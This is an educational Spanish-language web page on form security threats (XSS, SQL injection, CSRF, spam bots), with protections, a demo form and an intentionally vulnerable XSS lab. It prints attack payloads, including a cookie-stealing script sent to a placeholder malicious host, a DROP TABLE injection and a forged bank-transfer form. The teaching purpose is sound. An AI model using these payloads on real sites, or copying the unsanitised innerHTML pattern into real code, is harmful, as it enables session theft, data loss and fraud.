<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Amenazas de Seguridad en Formularios Web</title>
    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }

      body {
        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        padding: 20px;
        line-height: 1.6;
      }

      .container {
        max-width: 1200px;
        margin: 0 auto;
        background: white;
        border-radius: 15px;
        box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
        overflow: hidden;
      }

      header {
        background: linear-gradient(135deg, #ff6b6b 0%, #ee5a6f 100%);
        color: white;
        padding: 30px;
        text-align: center;
      }

      header h1 {
        font-size: 2.5em;
        margin-bottom: 10px;
      }

      header p {
        font-size: 1.1em;
        opacity: 0.9;
      }

      .content {
        padding: 40px;
      }

      .threat-section {
        margin-bottom: 40px;
        border-left: 5px solid #667eea;
        padding-left: 20px;
        background: #f8f9fa;
        padding: 25px;
        border-radius: 8px;
      }

      .threat-section h2 {
        color: #333;
        margin-bottom: 15px;
        display: flex;
        align-items: center;
        gap: 10px;
      }

      .threat-icon {
        font-size: 2em;
      }

      .threat-section h3 {
        color: #667eea;
        margin-top: 15px;
        margin-bottom: 10px;
      }

      .threat-section p {
        color: #555;
        margin-bottom: 15px;
      }

      .example-box {
        background: #fff;
        border: 2px solid #e74c3c;
        border-radius: 8px;
        padding: 15px;
        margin: 15px 0;
        font-family: "Courier New", monospace;
        font-size: 0.9em;
      }

      .example-box.danger {
        background: #ffe5e5;
      }

      .example-box.safe {
        background: #e8f5e9;
        border-color: #4caf50;
      }

      .protection {
        background: #e3f2fd;
        border-left: 5px solid #2196f3;
        padding: 15px;
        margin: 15px 0;
        border-radius: 5px;
      }

      .protection h4 {
        color: #1976d2;
        margin-bottom: 10px;
        display: flex;
        align-items: center;
        gap: 8px;
      }

      .protection ul {
        margin-left: 20px;
        color: #555;
      }

      .protection li {
        margin: 8px 0;
      }

      .demo-form {
        background: #ffffff;
        border: 3px solid #667eea;
        border-radius: 10px;
        padding: 30px;
        margin: 30px 0;
        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
      }

      .demo-form h3 {
        color: #667eea;
        margin-bottom: 20px;
        text-align: center;
      }

      .form-group {
        margin-bottom: 20px;
      }

      .form-group label {
        display: block;
        margin-bottom: 5px;
        color: #333;
        font-weight: 600;
      }

      .form-group input,
      .form-group textarea {
        width: 100%;
        padding: 12px;
        border: 2px solid #ddd;
        border-radius: 5px;
        font-size: 1em;
        transition: border-color 0.3s;
      }

      .form-group input:focus,
      .form-group textarea:focus {
        outline: none;
        border-color: #667eea;
      }

      .form-group textarea {
        resize: vertical;
        min-height: 100px;
      }

      .btn-submit {
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        color: white;
        padding: 15px 40px;
        border: none;
        border-radius: 5px;
        font-size: 1.1em;
        cursor: pointer;
        width: 100%;
        transition: transform 0.2s;
      }

      .btn-submit:hover {
        transform: translateY(-2px);
        box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
      }

      .warning-box {
        background: #fff3cd;
        border: 2px solid #ffc107;
        border-radius: 8px;
        padding: 15px;
        margin: 15px 0;
      }

      .warning-box strong {
        color: #856404;
      }

      footer {
        background: #333;
        color: white;
        text-align: center;
        padding: 20px;
      }

      code {
        background: #f4f4f4;
        padding: 2px 6px;
        border-radius: 3px;
        color: #e74c3c;
        font-family: "Courier New", monospace;
      }

      .security-level {
        display: inline-block;
        padding: 5px 15px;
        border-radius: 20px;
        font-size: 0.9em;
        font-weight: bold;
        margin-left: 10px;
      }

      .critical {
        background: #ff4444;
        color: white;
      }

      .high {
        background: #ff8800;
        color: white;
      }

      .medium {
        background: #ffbb33;
        color: #333;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <header>
        <h1>üîí Seguridad en Formularios Web</h1>
        <p>Gu√≠a Educativa sobre las Principales Amenazas y C√≥mo Protegerse</p>
      </header>

      <div class="content">
        <!-- Introducci√≥n -->
        <section class="threat-section">
          <h2>üìö Introducci√≥n</h2>
          <p>
            Los formularios web son uno de los puntos m√°s vulnerables de
            cualquier aplicaci√≥n web. Los atacantes utilizan diversas t√©cnicas
            para comprometer la seguridad, robar datos o manipular el
            comportamiento de la aplicaci√≥n. Esta gu√≠a te ayudar√° a entender las
            principales amenazas y c√≥mo protegerte.
          </p>
        </section>

        <!-- XSS -->
        <section class="threat-section">
          <h2>
            <span class="threat-icon">üíâ</span>
            1. Ataques XSS (Cross-Site Scripting)
            <span class="security-level critical">CR√çTICO</span>
          </h2>

          <h3>¬øQu√© es?</h3>
          <p>
            Un ataque XSS ocurre cuando un atacante inyecta c√≥digo JavaScript
            malicioso en una p√°gina web que ser√° ejecutado por otros usuarios.
            Esto permite robar cookies, sesiones, redirigir usuarios o modificar
            el contenido de la p√°gina.
          </p>

          <h3>Ejemplo de ataque:</h3>
          <div class="example-box danger">
            <strong>Input del atacante en un campo de comentarios:</strong
            ><br />
            &lt;script&gt;alert('¬°XSS!')&lt;/script&gt;<br />
            &lt;img src="x" onerror="alert(document.cookie)"&gt;<br />
            &lt;script&gt;window.location='http://sitio-malicioso.com?cookie='+document.cookie&lt;/script&gt;
          </div>

          <div class="warning-box">
            <strong>‚ö†Ô∏è Peligro:</strong> Si el sitio no valida la entrada, este
            c√≥digo se ejecutar√° en el navegador de todos los usuarios que vean
            ese comentario, robando sus cookies de sesi√≥n.
          </div>

          <div class="protection">
            <h4>üõ°Ô∏è Protecci√≥n contra XSS:</h4>
            <ul>
              <li>
                <strong>Escapar HTML:</strong> Convertir caracteres especiales
                (&lt;, &gt;, &amp;, ", ') en entidades HTML
              </li>
              <li>
                <strong>Validaci√≥n de entrada:</strong> No confiar nunca en los
                datos del usuario
              </li>
              <li>
                <strong>Content Security Policy (CSP):</strong> Headers HTTP que
                restringen qu√© scripts pueden ejecutarse
              </li>
              <li>
                <strong>HTTPOnly cookies:</strong> Evita que JavaScript acceda a
                las cookies de sesi√≥n
              </li>
              <li>
                <strong>Librer√≠as de sanitizaci√≥n:</strong> DOMPurify, OWASP
                Java HTML Sanitizer
              </li>
            </ul>
          </div>

          <div class="example-box safe">
            <strong>C√≥digo seguro (PHP):</strong><br />
            $comentario = htmlspecialchars($_POST['comentario'], ENT_QUOTES,
            'UTF-8');<br />
            echo $comentario; // Ahora es seguro mostrar
          </div>
        </section>

        <!-- SQL Injection -->
        <section class="threat-section">
          <h2>
            <span class="threat-icon">üóÑÔ∏è</span>
            2. Inyecci√≥n SQL
            <span class="security-level critical">CR√çTICO</span>
          </h2>

          <h3>¬øQu√© es?</h3>
          <p>
            La inyecci√≥n SQL permite a un atacante manipular consultas a la base
            de datos insertando c√≥digo SQL malicioso. Puede robar datos,
            eliminar informaci√≥n, o incluso tomar control completo del servidor
            de base de datos.
          </p>

          <h3>Ejemplo de ataque:</h3>
          <div class="example-box danger">
            <strong>Campo de login con usuario:</strong><br />
            admin' OR '1'='1<br /><br />
            <strong>Consulta SQL vulnerable resultante:</strong><br />
            SELECT * FROM usuarios WHERE username = 'admin' OR '1'='1' AND
            password = 'cualquiera'<br /><br />
            <strong>Resultado:</strong> ¬°Acceso concedido sin conocer la
            contrase√±a! ('1'='1' siempre es verdadero)
          </div>

          <div class="example-box danger">
            <strong>Ejemplo m√°s peligroso:</strong><br />
            admin'; DROP TABLE usuarios; --<br /><br />
            <strong>Esto ejecutar√≠a:</strong><br />
            SELECT * FROM usuarios WHERE username = 'admin';<br />
            DROP TABLE usuarios; -- el resto es comentario
          </div>

          <div class="protection">
            <h4>üõ°Ô∏è Protecci√≥n contra Inyecci√≥n SQL:</h4>
            <ul>
              <li>
                <strong>Prepared Statements (Sentencias Preparadas):</strong>
                Separar c√≥digo SQL de los datos
              </li>
              <li>
                <strong>Stored Procedures:</strong> Procedimientos almacenados
                parametrizados
              </li>
              <li>
                <strong>ORM (Object-Relational Mapping):</strong> Como Eloquent,
                Hibernate, Entity Framework
              </li>
              <li>
                <strong>Validaci√≥n estricta:</strong> Validar tipo y formato de
                datos
              </li>
              <li>
                <strong>Principio del menor privilegio:</strong> Usuario de BD
                con permisos m√≠nimos
              </li>
            </ul>
          </div>

          <div class="example-box safe">
            <strong>C√≥digo seguro (PHP con PDO):</strong><br />
            $stmt = $pdo->prepare('SELECT * FROM usuarios WHERE username = ? AND
            password = ?');<br />
            $stmt->execute([$username, $password]);<br />
            // Los valores se escapan autom√°ticamente
          </div>
        </section>

        <!-- CSRF -->
        <section class="threat-section">
          <h2>
            <span class="threat-icon">üé≠</span>
            3. CSRF (Cross-Site Request Forgery)
            <span class="security-level high">ALTO</span>
          </h2>

          <h3>¬øQu√© es?</h3>
          <p>
            CSRF enga√±a al usuario autenticado para que ejecute acciones no
            deseadas en una aplicaci√≥n web en la que est√° autenticado. El
            atacante aprovecha que el navegador env√≠a autom√°ticamente las
            cookies de sesi√≥n.
          </p>

          <h3>Ejemplo de ataque:</h3>
          <div class="example-box danger">
            <strong>P√°gina maliciosa que visita el usuario:</strong><br />
            &lt;img
            src="https://banco.com/transferir?cuenta=atacante&amp;monto=10000"
            /&gt;<br /><br />
            <strong>O un formulario invisible:</strong><br />
            &lt;form action="https://banco.com/transferir" method="POST"&gt;<br />
            &nbsp;&nbsp;&lt;input type="hidden" name="cuenta"
            value="atacante"&gt;<br />
            &nbsp;&nbsp;&lt;input type="hidden" name="monto"
            value="10000"&gt;<br />
            &lt;/form&gt;<br />
            &lt;script&gt;document.forms[0].submit();&lt;/script&gt;
          </div>

          <div class="warning-box">
            <strong>‚ö†Ô∏è Peligro:</strong> Si el usuario est√° autenticado en
            banco.com, la petici√≥n se enviar√° con sus cookies de sesi√≥n y la
            transferencia se realizar√° sin su consentimiento.
          </div>

          <div class="protection">
            <h4>üõ°Ô∏è Protecci√≥n contra CSRF:</h4>
            <ul>
              <li>
                <strong>CSRF Tokens:</strong> Token √∫nico y secreto en cada
                formulario que se valida en el servidor
              </li>
              <li>
                <strong>SameSite Cookies:</strong> Atributo que previene que las
                cookies se env√≠en en peticiones cross-site
              </li>
              <li>
                <strong>Verificar cabecera Referer/Origin:</strong> Comprobar de
                d√≥nde viene la petici√≥n
              </li>
              <li>
                <strong>Re-autenticaci√≥n:</strong> Para acciones cr√≠ticas,
                solicitar contrase√±a nuevamente
              </li>
              <li><strong>CAPTCHA:</strong> Para operaciones sensibles</li>
            </ul>
          </div>

          <div class="example-box safe">
            <strong>C√≥digo seguro (HTML + PHP):</strong><br />
            &lt;form method="POST"&gt;<br />
            &nbsp;&nbsp;&lt;input type="hidden" name="csrf_token"
            value="&lt;?php echo $_SESSION['csrf_token']; ?&gt;"&gt;<br />
            &nbsp;&nbsp;...<br />
            &lt;/form&gt;<br /><br />
            <strong>En el servidor:</strong><br />
            if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {<br />
            &nbsp;&nbsp;die('CSRF token inv√°lido');<br />
            }
          </div>
        </section>

        <!-- Spam y Bots -->
        <section class="threat-section">
          <h2>
            <span class="threat-icon">ü§ñ</span>
            4. Spam y Bots Automatizados
            <span class="security-level medium">MEDIO</span>
          </h2>

          <h3>¬øQu√© es?</h3>
          <p>
            Los bots automatizados intentan enviar spam masivo a trav√©s de
            formularios web: registros falsos, comentarios spam, emails
            publicitarios, etc. Esto puede saturar el sistema, llenar bases de
            datos con basura y afectar la calidad del servicio.
          </p>

          <h3>T√©cnicas de ataque:</h3>
          <div class="example-box danger">
            <strong>Ejemplos de spam:</strong><br />
            ‚Ä¢ Registro masivo de cuentas falsas<br />
            ‚Ä¢ Env√≠o de formularios de contacto con publicidad<br />
            ‚Ä¢ Comentarios autom√°ticos con enlaces a sitios maliciosos<br />
            ‚Ä¢ Scraping de contenido<br />
            ‚Ä¢ Ataques de fuerza bruta en login
          </div>

          <div class="protection">
            <h4>üõ°Ô∏è Protecci√≥n contra Spam y Bots:</h4>
            <ul>
              <li>
                <strong>reCAPTCHA:</strong> Google reCAPTCHA v2 o v3 (invisible)
              </li>
              <li>
                <strong>Honeypot:</strong> Campos ocultos que los bots rellenan
                pero los humanos no ven
              </li>
              <li>
                <strong>Rate Limiting:</strong> Limitar n√∫mero de env√≠os por IP
                o sesi√≥n
              </li>
              <li>
                <strong>Tiempo de llenado:</strong> Rechazar formularios
                enviados demasiado r√°pido
              </li>
              <li>
                <strong>An√°lisis de comportamiento:</strong> Detectar patrones
                no humanos
              </li>
              <li>
                <strong>Listas negras de IPs:</strong> Bloquear IPs conocidas de
                spam
              </li>
              <li>
                <strong>Verificaci√≥n por email:</strong> Confirmar email antes
                de activar cuenta
              </li>
            </ul>
          </div>

          <div class="example-box safe">
            <strong>Honeypot en HTML:</strong><br />
            &lt;!-- Campo oculto con CSS, no con type="hidden" --&gt;<br />
            &lt;input type="text" name="website" style="display:none"&gt;<br /><br />
            <strong>En el servidor:</strong><br />
            if (!empty($_POST['website'])) {<br />
            &nbsp;&nbsp;// Es un bot, rechazar el env√≠o<br />
            &nbsp;&nbsp;die('Spam detectado');<br />
            }
          </div>
        </section>

        <!-- Formulario de Demostraci√≥n -->
        <section class="threat-section">
          <h2>
            <span class="threat-icon">üß™</span>
            Formulario de Demostraci√≥n con Protecciones
          </h2>
          <p>
            Este es un ejemplo de formulario que implementa las protecciones
            b√°sicas mencionadas:
          </p>

          <div class="demo-form">
            <h3>üìù Formulario de Contacto Seguro</h3>
            <form id="secureForm" onsubmit="return validateForm(event)">
              <!-- CSRF Token (simulado) -->
              <input
                type="hidden"
                name="csrf_token"
                value="abc123xyz789"
                id="csrfToken"
              />

              <div class="form-group">
                <label for="nombre">Nombre completo:</label>
                <input
                  type="text"
                  id="nombre"
                  name="nombre"
                  required
                  maxlength="100"
                  pattern="[A-Za-z√Å√â√ç√ì√ö√°√©√≠√≥√∫√ë√±\s]+"
                  title="Solo letras y espacios"
                />
              </div>

              <div class="form-group">
                <label for="email">Email:</label>
                <input
                  type="email"
                  id="email"
                  name="email"
                  required
                  maxlength="100"
                />
              </div>

              <div class="form-group">
                <label for="mensaje">Mensaje:</label>
                <textarea
                  id="mensaje"
                  name="mensaje"
                  required
                  maxlength="1000"
                ></textarea>
              </div>

              <!-- Honeypot - Campo trampa para bots -->
              <div style="position: absolute; left: -9999px">
                <label for="website">Sitio web (no llenar):</label>
                <input
                  type="text"
                  id="website"
                  name="website"
                  tabindex="-1"
                  autocomplete="off"
                />
              </div>

              <div class="form-group">
                <label>
                  <input type="checkbox" required />
                  Acepto los t√©rminos y condiciones
                </label>
              </div>

              <button type="submit" class="btn-submit">
                üîí Enviar Formulario Seguro
              </button>
            </form>
          </div>

          <div class="protection">
            <h4>‚úÖ Protecciones implementadas en este formulario:</h4>
            <ul>
              <li>‚úì Token CSRF incluido (oculto)</li>
              <li>‚úì Validaci√≥n HTML5 (required, maxlength, pattern)</li>
              <li>‚úì Honeypot para detectar bots (campo "website" oculto)</li>
              <li>‚úì Validaci√≥n de tipos de datos (email, texto con patr√≥n)</li>
              <li>‚úì Limitaci√≥n de caracteres</li>
              <li>
                ‚úì En producci√≥n se a√±adir√≠a: reCAPTCHA, sanitizaci√≥n backend,
                rate limiting
              </li>
            </ul>
          </div>
        </section>

        <!-- Laboratorio de Pruebas XSS -->
        <section class="threat-section">
          <h2>
            <span class="threat-icon">‚öóÔ∏è</span>
            Laboratorio de Pruebas XSS (Educativo)
          </h2>
          <p>
            <strong>¬°Atenci√≥n!</strong> Esta secci√≥n te permite probar ataques
            XSS de forma segura para entender c√≥mo funcionan. Prueba los
            ejemplos a continuaci√≥n.
          </p>

          <div class="demo-form">
            <h3>üß® Formulario VULNERABLE (solo para demostraci√≥n)</h3>
            <p style="color: #e74c3c; margin-bottom: 15px">
              <strong
                >‚ö†Ô∏è Este formulario NO tiene protecci√≥n XSS
                intencionalmente</strong
              >
            </p>

            <div class="form-group">
              <label for="testInput"
                >Escribe tu entrada (prueba con c√≥digo malicioso):</label
              >
              <input type="text" id="testInput" placeholder='Ejemplo: &lt;img
              src=x onerror="alert(\'XSS\')"&gt;' style="width: 100%; padding:
              10px" />
            </div>

            <div
              style="
                background: #fff3cd;
                padding: 10px;
                border-radius: 5px;
                margin-bottom: 15px;
              "
            >
              <strong>üí° Nota:</strong> Los navegadores modernos bloquean
              <code>&lt;script&gt;</code> insertado con innerHTML. Usa los
              ejemplos con <code>&lt;img&gt;</code>, <code>&lt;svg&gt;</code> o
              eventos que s√≠ funcionan.
            </div>

            <button
              type="button"
              onclick="testVulnerable()"
              style="
                background: #e74c3c;
                color: white;
                padding: 10px 20px;
                border: none;
                border-radius: 5px;
                cursor: pointer;
                margin-right: 10px;
              "
            >
              üî¥ Mostrar SIN Protecci√≥n (Vulnerable)
            </button>

            <button
              type="button"
              onclick="testSecure()"
              style="
                background: #27ae60;
                color: white;
                padding: 10px 20px;
                border: none;
                border-radius: 5px;
                cursor: pointer;
              "
            >
              üü¢ Mostrar CON Protecci√≥n (Seguro)
            </button>

            <div style="margin-top: 20px">
              <h4>Resultado Vulnerable (sin protecci√≥n):</h4>
              <div
                id="vulnerableOutput"
                style="
                  background: #ffe5e5;
                  border: 2px solid #e74c3c;
                  padding: 15px;
                  min-height: 60px;
                  margin-top: 10px;
                  border-radius: 5px;
                "
              >
                <em>El contenido aparecer√° aqu√≠ sin escapar...</em>
              </div>

              <h4 style="margin-top: 20px">
                Resultado Seguro (con protecci√≥n):
              </h4>
              <div
                id="secureOutput"
                style="
                  background: #e8f5e9;
                  border: 2px solid #4caf50;
                  padding: 15px;
                  min-height: 60px;
                  margin-top: 10px;
                  border-radius: 5px;
                "
              >
                <em>El contenido aparecer√° aqu√≠ escapado...</em>
              </div>
            </div>
          </div>

          <div class="warning-box" style="margin-top: 20px">
            <strong
              >üí° Ejemplos de c√≥digo XSS para probar (copia y pega):</strong
            ><br /><br />
            <strong>‚úÖ Estos S√ç funcionan con innerHTML:</strong><br />
            <code>&lt;img src=x onerror="alert('¬°XSS Funciona!')"&gt;</code
            ><br />
            <code>&lt;svg onload=alert('¬°XSS con SVG!')&gt;</code><br />
            <code
              >&lt;img src=x
              onerror="document.getElementById('vulnerableOutput').style.background='red'"&gt;</code
            ><br />
            <code
              >&lt;img src=x onerror="this.parentElement.innerHTML='&lt;h1
              style=color:red&gt;SITIO HACKEADO&lt;/h1&gt;'"&gt;</code
            ><br /><br />
            <strong>‚ùå Este NO funciona (navegadores lo bloquean):</strong
            ><br />
            <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> ‚Üê Los
            navegadores modernos impiden esto con innerHTML
          </div>

          <div class="protection" style="margin-top: 20px">
            <h4>üîç Observa la diferencia:</h4>
            <ul>
              <li>
                <strong>Sin protecci√≥n:</strong> El c√≥digo se ejecuta (alert,
                cambio de contenido, etc.)
              </li>
              <li>
                <strong>Con protecci√≥n:</strong> El c√≥digo se muestra como texto
                plano, no se ejecuta
              </li>
              <li>
                <strong>T√©cnica usada:</strong> Escapado de caracteres HTML
                (&lt;, &gt;, &amp;, ", ')
              </li>
            </ul>
          </div>
        </section>

        <!-- Resumen -->
        <section class="threat-section">
          <h2>üìã Resumen de Mejores Pr√°cticas</h2>
          <div class="protection">
            <h4>üéØ Reglas de Oro de Seguridad en Formularios:</h4>
            <ul>
              <li>
                <strong>Nunca conf√≠es en los datos del usuario:</strong> Validar
                y sanitizar TODO
              </li>
              <li>
                <strong>Defensa en profundidad:</strong> M√∫ltiples capas de
                seguridad
              </li>
              <li>
                <strong>Validaci√≥n en cliente Y servidor:</strong> HTML5 +
                backend
              </li>
              <li>
                <strong>Usar HTTPS siempre:</strong> Encriptar toda la
                comunicaci√≥n
              </li>
              <li>
                <strong>Mantener software actualizado:</strong> Frameworks,
                librer√≠as, servidor
              </li>
              <li>
                <strong>Logging y monitoreo:</strong> Registrar intentos de
                ataque
              </li>
              <li>
                <strong>Educaci√≥n continua:</strong> Mantenerse informado de
                nuevas vulnerabilidades
              </li>
              <li>
                <strong>Testing de seguridad:</strong> Pruebas de penetraci√≥n
                regulares
              </li>
            </ul>
          </div>
        </section>
      </div>

      <footer>
        <p>
          üîê <strong>Seguridad Web - Material Educativo</strong> | Protege tus
          formularios, protege a tus usuarios
        </p>
        <p style="margin-top: 10px; font-size: 0.9em; opacity: 0.8">
          Este documento es solo para fines educativos. Nunca uses estas
          t√©cnicas para ataques reales.
        </p>
      </footer>
    </div>

    <script>
      // Validaci√≥n adicional del formulario
      function validateForm(event) {
        event.preventDefault();

        const honeypot = document.getElementById("website").value;

        // Verificar honeypot
        if (honeypot !== "") {
          alert(
            "‚ö†Ô∏è Spam detectado! El campo honeypot fue llenado. Los bots suelen llenar todos los campos, pero este deber√≠a estar vac√≠o."
          );
          return false;
        }

        // Verificar CSRF token (simulaci√≥n)
        const csrfToken = document.getElementById("csrfToken").value;
        if (csrfToken !== "abc123xyz789") {
          alert("‚ö†Ô∏è Token CSRF inv√°lido! Posible ataque CSRF detectado.");
          return false;
        }

        // Sanitizaci√≥n b√°sica de demostraci√≥n
        const mensaje = document.getElementById("mensaje").value;
        const nombre = document.getElementById("nombre").value;

        // Detectar intentos de XSS b√°sicos
        const xssPatterns = [
          /<script/i,
          /javascript:/i,
          /onerror=/i,
          /onclick=/i,
        ];
        const hasXSS = xssPatterns.some(
          (pattern) => pattern.test(mensaje) || pattern.test(nombre)
        );

        if (hasXSS) {
          alert(
            "‚ö†Ô∏è Intento de XSS detectado! Se detectaron patrones sospechosos en tu entrada. En un sistema real, estos caracteres ser√≠an escapados."
          );
          return false;
        }

        // Si pasa todas las validaciones
        alert(
          "‚úÖ ¬°Formulario v√°lido!\n\n" +
            "En un sistema real:\n" +
            "1. El servidor verificar√≠a el token CSRF\n" +
            "2. Sanitizar√≠a todos los inputs\n" +
            "3. Usar√≠a prepared statements para la BD\n" +
            "4. Verificar√≠a rate limiting\n" +
            "5. Registrar√≠a el evento en logs\n\n" +
            "Datos a enviar:\n" +
            "Nombre: " +
            nombre +
            "\n" +
            "Email: " +
            document.getElementById("email").value +
            "\n" +
            "Mensaje: " +
            mensaje.substring(0, 50) +
            "..."
        );

        return false; // Evitar env√≠o real en esta demo
      }

      // Mensaje al cargar la p√°gina
      console.log("üîí Formulario de seguridad cargado correctamente");
      console.log("üí° Abre las DevTools para ver m√°s detalles de seguridad");

      // Prevenir que el formulario se env√≠e accidentalmente
      document
        .getElementById("secureForm")
        .addEventListener("submit", validateForm);

      // ==================== LABORATORIO XSS ====================

      // Funci√≥n para mostrar entrada SIN protecci√≥n (VULNERABLE)
      function testVulnerable() {
        const input = document.getElementById("testInput").value;
        const output = document.getElementById("vulnerableOutput");

        // ‚ö†Ô∏è PELIGRO: innerHTML sin sanitizar - VULNERABLE A XSS
        output.innerHTML = "<strong>Entrada del usuario:</strong><br>" + input;

        console.log("üî¥ VULNERABLE: Se us√≥ innerHTML sin sanitizar");
        console.log("Entrada:", input);
      }

      // Funci√≥n para mostrar entrada CON protecci√≥n (SEGURO)
      function testSecure() {
        const input = document.getElementById("testInput").value;
        const output = document.getElementById("secureOutput");

        // ‚úÖ SEGURO: Escapar caracteres HTML
        const escaped = escapeHtml(input);
        output.innerHTML =
          "<strong>Entrada del usuario (escapada):</strong><br>" + escaped;

        console.log("üü¢ SEGURO: Se escaparon los caracteres HTML");
        console.log("Entrada original:", input);
        console.log("Entrada escapada:", escaped);
      }

      // Funci√≥n para escapar HTML (convierte caracteres especiales)
      function escapeHtml(text) {
        const map = {
          "&": "&amp;",
          "<": "&lt;",
          ">": "&gt;",
          '"': "&quot;",
          "'": "&#039;",
        };
        return text.replace(/[&<>"']/g, (char) => map[char]);
      }

      // Alternativa usando textContent (tambi√©n seguro)
      function testSecureAlternative() {
        const input = document.getElementById("testInput").value;
        const output = document.getElementById("secureOutput");

        // ‚úÖ SEGURO: textContent nunca ejecuta HTML/JavaScript
        output.textContent = "Entrada del usuario: " + input;
      }

      // Ejemplos educativos en consola
      console.log("\nüß™ EJEMPLOS DE XSS PARA PROBAR:");
      console.log("‚úÖ Funcionan con innerHTML:");
      console.log("1. <img src=x onerror=\"alert('XSS')\">");
      console.log("2. <svg onload=alert('XSS')>");
      console.log(
        "3. <img src=x onerror=\"this.parentElement.innerHTML='<h1>HACKEADO</h1>'\">"
      );
      console.log("\n‚ùå No funciona (navegadores lo bloquean):");
      console.log(
        "4. <script>alert('XSS')<\/script> ‚Üê Bloqueado por el navegador"
      );
      console.log(
        "\nüí° Copia cualquiera de estos en el campo de entrada y prueba ambos botones"
      );
      console.log("üî¥ Bot√≥n rojo = sin protecci√≥n (el c√≥digo se ejecuta)");
      console.log(
        "üü¢ Bot√≥n verde = con protecci√≥n (el c√≥digo se muestra como texto)"
      );
    </script>
  </body>
</html>
